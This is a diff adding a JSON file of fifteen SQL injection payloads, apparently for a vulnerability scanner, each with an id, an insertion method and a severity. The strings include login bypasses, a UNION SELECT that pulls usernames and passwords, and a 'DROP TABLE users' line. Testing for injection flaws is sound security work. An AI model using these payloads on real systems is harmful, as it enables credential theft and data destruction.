@@ -1,0 +1,21 @@
+{
+  "name": "SQL Injection",
+  "description": "Payloads for testing SQL injection vulnerabilities",
+  "payloads": [
+    {"id": "sqli-01", "value": "' OR '1'='1", "method": "replace", "severity": "critical"},
+    {"id": "sqli-02", "value": "' OR 1=1 --", "method": "append", "severity": "critical"},
+    {"id": "sqli-03", "value": "admin' --", "method": "replace", "severity": "high"},
+    {"id": "sqli-04", "value": "' UNION SELECT NULL--", "method": "append", "severity": "critical"},
+    {"id": "sqli-05", "value": "1' AND '1'='1", "method": "append", "severity": "high"},
+    {"id": "sqli-06", "value": "' OR 'x'='x", "method": "replace", "severity": "critical"},
+    {"id": "sqli-07", "value": "1; DROP TABLE users --", "method": "append", "severity": "critical"},
+    {"id": "sqli-08", "value": "' OR 1=1#", "method": "append", "severity": "critical"},
+    {"id": "sqli-09", "value": "admin'/*", "method": "replace", "severity": "high"},
+    {"id": "sqli-10", "value": "' OR '1'='1' --", "method": "append", "severity": "critical"},
+    {"id": "sqli-11", "value": "' UNION SELECT username,password FROM users--", "method": "append", "severity": "critical"},
+    {"id": "sqli-12", "value": "1' OR '1' = '1", "method": "replace", "severity": "critical"},
+    {"id": "sqli-13", "value": "\" OR \"1\"=\"1", "method": "replace", "severity": "high"},
+    {"id": "sqli-14", "value": "' HAVING 1=1--", "method": "append", "severity": "high"},
+    {"id": "sqli-15", "value": "1 AND 1=1", "method": "append", "severity": "medium"}
+  ]
+}
